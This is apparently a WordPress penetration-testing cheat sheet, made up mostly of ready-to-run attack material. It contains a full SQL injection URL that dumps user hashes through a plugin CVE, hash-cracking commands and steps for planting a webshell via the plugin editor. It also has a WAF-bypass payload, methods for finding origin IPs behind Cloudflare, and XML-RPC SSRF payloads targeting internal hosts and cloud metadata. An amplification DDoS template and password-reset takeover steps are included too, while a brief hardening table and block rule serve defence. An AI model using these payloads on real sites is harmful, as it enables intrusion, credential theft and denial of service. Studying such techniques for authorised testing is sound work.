# WordPress Penetration Testing Guide

## Tools

```bash
# https://github.com/wpscanteam/wpscan
wpscan --url https://url.com

# https://github.com/Chocapikk/wpprobe
wpprobe scan -u https://target.com/ --mode hybrid
```

---

## Information Gathering & User Enumeration

### Username Enumeration via REST API

WordPress REST API endpoint `/wp-json/wp/v2/users/` often exposes registered usernames without authentication.

```bash
# REST API enumeration
curl -s "http://target.com/wp-json/wp/v2/users" | jq

# Manual enumeration via author ID (classic method)
for i in {1..50}; do 
    curl -s -L -i https://example.com/?author=$i | grep -E -o "Location:.*" | awk -F/ '{print $NF}'
done
```

**Real-world impact:** During penetration tests in 2024, this technique consistently revealed valid usernames for brute-force attacks. The REST API endpoint is often overlooked by administrators who focus on traditional `?author=N` enumeration.

### Using wp-enumeration Tool

```bash
./wp-enumeration.sh
# Enter domain when prompted
example.com
# Output: List of usernames in color-coded format
```

---

## Bypassing Cloudflare WAF to Find Origin IP

Modern WordPress sites often use Cloudflare as a reverse proxy. Finding the origin IP allows direct server access, bypassing all WAF protections.

### Method 1: Email Header Analysis

When the target sends emails (password reset, newsletter confirmation, order notification), the originating IP may be exposed in email headers.

**Steps:**
1. Register an account on the target site
2. Request password reset
3. Check email headers for `Received` fields
4. Look for IP addresses that don't belong to Cloudflare (not in Cloudflare's IP ranges)

### Method 2: Historical DNS Records

Old DNS records often reveal the origin IP before Cloudflare was configured.

**Tools:**
- ViewDNS.info (free)
- SecurityTrails (free trial)
- Censys

**Example from penetration test:** A bug bounty hunter discovered a SQL injection vulnerability but was blocked by Cloudflare WAF. By checking historical DNS records, they found the origin IP (203.0.113.45) that was still active. Direct access to `http://203.0.113.45/api/videos?topic=1337` bypassed all WAF restrictions completely.

### Method 3: SSL Certificate Analysis

SSL certificates often contain origin IP information in Certificate Transparency logs.

```bash
# Using crt.sh
curl -s "https://crt.sh/?q=%25.target.com&output=json" | jq -r '.[].name_value' | sort -u
```

### Method 4: ASN Mapping

Identify the target's Autonomous System Number (ASN) and scan associated IP ranges.

**Process:**
1. Search Hurricane Electric BGP Toolkit for target organization
2. Get ASN from search results
3. Map IP ranges using asnmap
4. Scan ranges with masscan

```bash
# Using asnmap
asnmap -org "Target Organization" > ranges.txt

# Masscan to find live hosts
sudo masscan -iL ranges.txt -p80,443,8080,8443 --rate=10000
```

### Method 5: XML-RPC as Origin IP Discovery Tool

The `pingback.ping` method can be used to make the WordPress server connect to your server, revealing its real IP address.

```bash
# Set up listener
python3 -m http.server 8000

# Send pingback with your server as target
curl -X POST https://target.com/xmlrpc.php -d @pingback.xml
```

**pingback.xml:**
```xml
<?xml version="1.0" encoding="iso-8859-1"?>
<methodCall>
<methodName>pingback.ping</methodName>
<params>
 <param>
  <value><string>http://YOUR_SERVER:8000</string></value>
 </param>
 <param>
  <value><string>https://target.com/valid-post/</string></value>
 </param>
</params>
</methodCall>
```

Check your server logs for the incoming connection - the source IP is the WordPress origin server.

---

## SQL Injection Exploitation

### SQLi to Admin Access: Real Case Study

In 2024, a penetration tester discovered an unauthenticated SQL injection in the Perfect Survey plugin (CVE-2021-24762) on a WordPress target.

**Vulnerable endpoint:** `/wp-admin/admin-ajax.php?action=get_question`

**Exploit payload:**
```
https://example.com/wp-admin/admin-ajax.php?action=get_question&question_id=1%20union%20select%201%2C1%2Cchar(116%2C101%2C120%2C116)%2Cuser_login%2Cuser_pass%2C0%2C0%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%20from%20wp_users
```

**What happened:** The payload extracted username and password hash from `wp_users` table. The `question_id` parameter was vulnerable to union-based SQL injection.

**Cracking the hash:**
```bash
# Hashcat mode 400 = WordPress (MD5)
hashcat -m 400 -a 0 '5f4dcc3b5aa765d61d8327deb882cf99' /usr/share/wordlists/rockyou.txt
```

The password was cracked within seconds. The tester logged into `/wp-admin` and uploaded a webshell by modifying the "Hello Dolly" plugin.

**Webshell upload steps:**
1. Navigate to Plugins → Plugin Editor
2. Select "Hello Dolly" plugin
3. Replace `hello.php` content with PHP webshell
4. Access shell at `/wp-content/plugins/hello.php`

### WAF Bypass for SQL Injection

When Cloudflare blocks SQLi attempts, adding spaces between function names and parentheses often bypasses detection.

**Blocked payload:**
```
/api/videos?topic=1337'+and+ascii(substring(current_database(),1,1))>32--
```

**Working payload:**
```
/api/videos?topic=1337'+and+ascii+(substring+(current_database(),1,1))>32--
```

**Real example from 2025:** A tester found a boolean blind SQL injection in a PostgreSQL-backed WordPress API. After 8 hours of failed bypass attempts, adding spaces between `ascii` and `(` finally worked, allowing extraction of the entire database name character by character.

### SQLi with Password Reset (Without Cracking Hashes)

**Technique:** When SQLi exposes activation keys directly, you can bypass password cracking entirely.

**Process:**
1. Use SQL injection to extract user email and activation key from `wp_users` or `wp_usermeta`
2. Request password reset for that user (triggers key generation if not present)
3. Extract the generated key via SQL injection
4. Access reset link: `https://site.com/wp-login.php?action=rp&key={ACTIVATION_KEY}&login={USERNAME}`
5. Set new password without ever cracking the hash

---

## XML-RPC Exploitation

### Checking if XML-RPC is Enabled

```bash
# Simple probe
curl -d '<?xml version="1.0" encoding="iso-8859-1"?><methodCall><methodName>demo.sayHello</methodName><params/></methodCall>' -k https://example.com/xmlrpc.php

# Expected response if enabled
# "XML-RPC server accepts POST requests only" (HTTP 200)
```

### Listing Available Methods

```xml
<methodCall>
<methodName>system.listMethods</methodName>
<params></params>
</methodCall>
```

```bash
curl -X POST -d @list_methods.xml https://example.com/xmlrpc.php
```

### SSRF via pingback.ping (CVE-2017-5611)

The `pingback.ping` method is vulnerable to Server-Side Request Forgery. It allows an attacker to make the WordPress server send HTTP requests to arbitrary destinations.

**Exploit payload:**
```xml
<?xml version="1.0" encoding="iso-8859-1"?>
<methodCall>
<methodName>pingback.ping</methodName>
<params>
 <param>
  <value><string>http://10.0.0.1:8080/admin</string>
 </value>
 </param>
 <param>
  <value><string>https://target.com/valid-post/</string>
 </value>
 </param>
</params>
</methodCall>
```

**What this does:** The WordPress server will make a request to `http://10.0.0.1:8080/admin` and return the response (or error). This allows:

- Internal network scanning (port 3306 for MySQL, 5432 for PostgreSQL, 6379 for Redis)
- Cloud metadata API access (`http://169.254.169.254/latest/meta-data/`)
- Localhost service exploitation
- Denial of Service via amplified requests

**Real-world discovery (2025):** A security researcher found `xmlrpc.php` enabled on a WordPress site. Using `system.listMethods`, they confirmed `pingback.ping` was available. A crafted payload sent to their Burp Collaborator confirmed blind SSRF. They could then scan internal network: `http://192.168.1.1:8080` (admin panel exposed), `http://10.0.0.5:3306` (MySQL responding).

### SSRF for Port Scanning

```xml
<methodCall>
<methodName>pingback.ping</methodName>
<params>
<param><value><string>http://127.0.0.1:22</string></value></param>
<param><value><string>https://target.com/post/</string></value></param>
</params>
</methodCall>
```

**Response analysis:**
- `faultCode 17` + `faultString` = Port closed or service not responding
- HTTP response or timeout difference = Port open

### XML-RPC Amplification DDoS

The `system.multicall` method can batch multiple pingback requests, amplifying traffic.

```xml
<methodCall>
<methodName>system.multicall</methodName>
<params>
<param>
<value><array><data>
<value><struct>
<member><name>methodName</name><value><string>pingback.ping</string></value></member>
<member><name>params</name>
<value><array><data>
<value><string>http://victim.com/</string></value>
<value><string>https://target.com/post/</string></value>
</data></array></value>
</member>
</struct></value>
<!-- Repeat 50+ times -->
</data></array></value>
</param>
</params>
</methodCall>
```

### Remediation for XML-RPC

```apache
# .htaccess to block xmlrpc.php completely
<Files "xmlrpc.php">
    Order Deny,Allow
    Deny from all
</Files>
```

Or using WordPress plugin or firewall rule to block `/xmlrpc.php` endpoint.

---

## Plugin Vulnerabilities (Real Attacks 2024-2025)

### GutenKit and Hunk Companion Mass Exploitation (October 2025)

**Scale:** 8.7 million attack attempts blocked in 48 hours

**Vulnerable plugins:**
- GutenKit < 2.1.1 (CVE-2024-9234, CVSS 9.8)
- Hunk Companion < 1.9.0 (CVE-2024-9707, CVE-2024-11972)

**Attack chain:**
1. Unauthenticated attacker exploits arbitrary plugin installation vulnerability
2. Attacker installs malicious plugin hosted on GitHub named "up"
3. Malicious plugin contains obfuscated backdoor masquerading as All in One SEO component
4. Backdoor automatically logs attacker in as administrator
5. If admin access fails, attacker deploys "wp-query-console" plugin for RCE

**Key takeaway:** Both vulnerabilities were patched nearly a year before the attack campaign. Unpatched installations were the target.

### W3 Total Cache Credential Exposure (CVE-2023-5359)

**Vulnerability:** W3 Total Cache <= 2.7.5 stores SMTP credentials in cleartext within plugin files.

**Attack process:**
1. Identify target running vulnerable W3 Total Cache
2. Access `/wp-content/plugins/w3-total-cache/` directory
3. Locate configuration files containing plaintext credentials
4. Extract SMTP username, password, and server information

**Real impact:** Attackers can use exposed SMTP credentials to send phishing emails from legitimate WordPress infrastructure, bypassing email reputation filters.

### Easy WP SMTP Debug Log Exposure

**Vulnerable versions:** Easy WP SMTP <= 1.4.2 with debug option enabled

**Attack chain (real exploit):**
1. Find debug log file: `/wp-content/plugins/easy-wp-smtp/[a-z0-9]{5,15}_debug_log.txt`
2. Directory listing enabled, so file is easily discoverable
3. Request password reset for target user account
4. Read debug log file containing the password reset link
5. Use captured link to change user's password

**From a 2021 report:** "The debug log file contains SMTP logs for the WordPress instance... pretty easy to exploit".

---

## WordPress Hardening Checklist (Defensive)

| Component | Action |
|-----------|--------|
| XML-RPC | Block `/xmlrpc.php` entirely unless required |
| REST API | Restrict user enumeration endpoints |
| WAF | Don't rely on WAF alone; patch plugins immediately |
| Plugins | Update GutenKit to 2.1.1+, Hunk Companion to 1.9.0+ |
| W3 Total Cache | Update to 2.7.6+ |
| Easy WP SMTP | Update to 1.4.3+ or disable debug mode |
| Origin IP | Ensure no direct access to origin server IP |
| Password Reset | Implement rate limiting and logging |

---

## Summary of Attack Chains

**External to Internal via XML-RPC SSRF:**
```
xmlrpc.php (pingback.ping) → SSRF → Internal metadata API (169.254.169.254) → Cloud credentials → Internal network access
```

**SQLi to Full Compromise:**
```
SQL injection → Extract admin hash → Crack password → wp-admin → Plugin edit → Webshell → Server access
```

**WAF Bypass via Origin IP:**
```
Find origin IP via DNS history/email headers/SSL certs → Direct request bypassing Cloudflare → SQL injection works
```

**Password Reset Without Cracking:**
```
SQL injection → Extract activation key → Direct reset link access → New password set
```
